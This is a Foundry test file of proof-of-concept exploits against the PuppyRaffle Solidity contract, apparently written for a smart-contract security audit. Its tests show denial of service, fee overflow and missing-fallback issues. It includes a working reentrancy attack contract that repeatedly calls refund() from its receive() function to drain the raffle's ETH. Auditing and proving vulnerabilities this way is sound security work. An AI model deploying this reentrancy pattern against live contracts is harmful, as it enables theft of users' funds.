// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;
pragma experimental ABIEncoderV2;

import {Test, console} from "forge-std/Test.sol";
// local (contract) imports
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract MyPuppyRaffleTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1e18;
    address playerOne = address(1);
    address playerTwo = address(2);
    address playerThree = address(3);
    address playerFour = address(4);
    address feeAddress = address(99);
    uint256 duration = 1 days;

    function setUp() public {
        puppyRaffle = new PuppyRaffle(entranceFee, feeAddress, duration);
    }

    // this is to prove the Denial of Service that can be caused by adding long newPlayers
    /* */
    function testEnterRaffleDOS(uint256 playersLength) public {
        // playersLength = bound(playersLength, 400, 500);
        vm.assume(playersLength > 100 && playersLength < 200);
        // playersLength = 91;
        address[] memory newPlayers = new address[](playersLength);
        vm.deal(address(this), playersLength * 1 ether);

        /* */
        for (uint256 i = 0; i < playersLength; i++) {
            newPlayers[i] = address(
                uint160(
                    uint256(
                        keccak256(
                            abi.encodePacked(
                                block.difficulty,
                                block.timestamp * (i + 1)
                            )
                        )
                    )
                )
            );
        }

        /**
         * for (uint256 i = 0; i < 100; i++) {
         *         players[i] =
         *             address(uint160(uint256(keccak256(abi.encodePacked(block.difficulty, block.timestamp * (i + 1))))));
         *     }
         */

        puppyRaffle.enterRaffle{value: newPlayers.length * entranceFee}(
            newPlayers
        );
    }

    function testConsoleUint(uint256 playersLength) public {
        playersLength = bound(playersLength, 400, 500);
        console.logUint(playersLength);
        assert(playersLength > 0);
    }

    modifier enterPlayers() {
        address[] memory newPlayers = new address[](4);

        newPlayers[0] = playerFour;
        newPlayers[1] = playerOne;
        newPlayers[2] = playerTwo;
        newPlayers[3] = playerThree;

        vm.deal(playerOne, 10 ether);

        vm.prank(playerOne);
        puppyRaffle.enterRaffle{value: entranceFee * 4}(newPlayers);
        _;
    }

    // prove reentrancy attack
    function testRefundReentrancy() public enterPlayers {
        uint256 prevPuppyRaffleBal = address(puppyRaffle).balance;
        console.log("PuppyRaffle Balance (PREV):", prevPuppyRaffleBal);

        vm.deal(address(this), 1 ether);

        AttackPuppyRaffleReentrancyUsingStake attacker = new AttackPuppyRaffleReentrancyUsingStake(
                puppyRaffle
            );

        // let's attack
        attacker.attack{value: entranceFee}();

        uint256 updatedPuppyRaffleBal = address(puppyRaffle).balance;
        console.log("PuppyRaffle Balance (UPDATED):", updatedPuppyRaffleBal);

        assertGt(prevPuppyRaffleBal, updatedPuppyRaffleBal);
    }

    function testEnterRaffleDos() public {
        vm.deal(address(this), 4 ether);
        address[] memory players = new address[](1);
        uint256 gasUsed;
        uint256 prevGas = gasleft();
        players[0] = playerOne;
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        gasUsed = prevGas - gasleft();

        players[0] = playerTwo;
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        assertLt(gasUsed, prevGas - gasleft());

        gasUsed = prevGas - gasleft();

        players[0] = playerThree;
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        assertLt(gasUsed, prevGas - gasleft());

        gasUsed = prevGas - gasleft();

        players[0] = playerFour;
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        assertLt(gasUsed, prevGas - gasleft());
    }

    function testOverflowDuesToFeeCasting() public {
        uint256 playersLength = ((type(uint64).max / 1 ether) + 1) * 5; // i.e 0.2 => 1/5
        address[] memory newPlayers = new address[](playersLength);

        for (uint256 i = 0; i < playersLength; i++) {
            newPlayers[i] = address(i + 1);
        }
        vm.deal(address(this), playersLength * 1 ether);

        puppyRaffle.enterRaffle{value: playersLength * 1 ether}(newPlayers);

        // let's selectWinner
        vm.warp(block.timestamp + duration);
        puppyRaffle.selectWinner();

        uint256 totalFees = puppyRaffle.totalFees();
        uint256 expectedTotalFees = (address(puppyRaffle).balance * 20) / 100;

        assertLt(totalFees, expectedTotalFees);
    }

    function testSendEthToSCWithoutFallback() public {
        vm.deal(address(this), 2 ether);
        uint256 initialBal = address(this).balance;
        MissingFallbackToReceiveEther myContract = new MissingFallbackToReceiveEther();

        vm.expectRevert();
        (bool success, ) = payable(address(myContract)).call{value: 1 ether}(
            ""
        );
        require(success);

        uint256 currentBal = address(this).balance;
        assertEq(currentBal, initialBal);
    }
}

contract AttackPuppyRaffleReentrancyUsingStake {
    PuppyRaffle puppyRaffle;
    address payable owner;
    uint256 playerIndex;

    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
        owner = msg.sender;
    }

    function attack() public payable {
        require(
            msg.value == puppyRaffle.entranceFee(),
            "Better send exact ETH (entranceFee) to run this hack"
        );

        // we need to enter game, put our stake
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: msg.value}(players);

        // let's call refund
        playerIndex = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(playerIndex);
    }

    function withdraw() public {
        require(msg.sender == owner, "Only owner fit collect funds!");

        (bool success, ) = owner.call{value: address(this).balance}("");

        require(success, "Something sup: Failed to send balance");
    }

    receive() external payable {
        // as we don receive ETH, make we refund again recursively
        if (address(puppyRaffle).balance >= 1 ether) {
            puppyRaffle.refund(playerIndex);
        }
    }
}

contract MissingFallbackToReceiveEther {
    address owner;

    constructor() {
        owner = msg.sender;
    }

    function getOwner() public view returns (address) {
        return owner;
    }
}
